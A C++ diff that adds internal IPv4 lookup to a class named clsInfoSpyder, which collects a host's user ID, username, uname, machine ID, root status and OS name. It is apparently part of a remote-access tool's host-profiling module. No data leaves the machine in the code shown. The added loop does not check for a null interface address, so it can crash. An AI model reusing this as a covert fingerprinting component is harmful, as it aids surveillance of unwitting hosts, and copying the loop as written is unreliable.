@@ -10,6 +10,7 @@
 #include <sstream>
 #include <vector>
 #include <unordered_map>
+#include <ifaddrs.h>
 
 #include "clsTools.hpp"
 
@@ -19,6 +20,7 @@ public:
     struct stInfo
     {
         uid_t m_nUid;
+        std::string m_szIPv4;
         std::string m_szOSName;
         std::string m_szUsername;
         std::string m_szUname;
@@ -31,6 +33,7 @@ public:
 
         stInfo(
             uid_t uid,
+            const std::string &szIPv4,
             const std::string &szOSName,
             const std::string &szUsername,
             const std::string &szUname,
@@ -39,6 +42,7 @@ public:
             bool bHasDesktop
         )
             : m_nUid(uid),
+              m_szIPv4(szIPv4),
               m_szOSName(szOSName),
               m_szUsername(szUsername),
               m_szUname(szUname),
@@ -53,6 +57,7 @@ public:
     clsInfoSpyder()
     {
         uid_t uid = getuid();
+        std::string szIPv4 = fnszGetInternalIPv4();
         std::string szOsName = fnszGetOSName();
         std::string szUsername = fnszUsernameFromUid(uid);
         std::string szUname = fnszUnameInfo();
@@ -62,10 +67,13 @@ public:
         
         stInfo info;
         info.m_nUid = uid;
+        info.m_szIPv4 = szIPv4;
         info.m_szUsername = szUsername;
         info.m_szUname = szUname;
         info.m_szMachineID = szMachineID;
         info.m_bIsRoot = bIsRoot;
+        info.m_szOSName = szOsName;
+        //info.m_bHasDesktop = bHasDesktop;
 
         m_info = info;
     }
@@ -223,4 +231,40 @@ public:
 
         return false;
     }
+
+    std::string fnszGetInternalIPv4()
+    {
+        struct ifaddrs *ifAddrStruct = nullptr;
+        struct ifaddrs *ifa = nullptr;
+        void *tmpAddrPtr = nullptr;
+
+        if (getifaddrs(&ifAddrStruct) == -1)
+        {
+            //todo: output error message.
+            return "[UNKNOWN]";
+        }
+
+        std::string szIPAddr = "";
+        for (ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next)
+        {
+            if (ifa->ifa_addr->sa_family == AF_INET)
+            {
+                tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+                char addressBuffer[INET_ADDRSTRLEN];
+                inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
+                
+                // Skip loopback address
+                if (std::string(ifa->ifa_name) != "lo") {
+                    szIPAddr = addressBuffer;
+                    break;
+                }
+            }
+        }
+
+        if (ifAddrStruct != nullptr)
+            freeifaddrs(ifAddrStruct);
+        
+        return szIPAddr;
+    }
+
 };
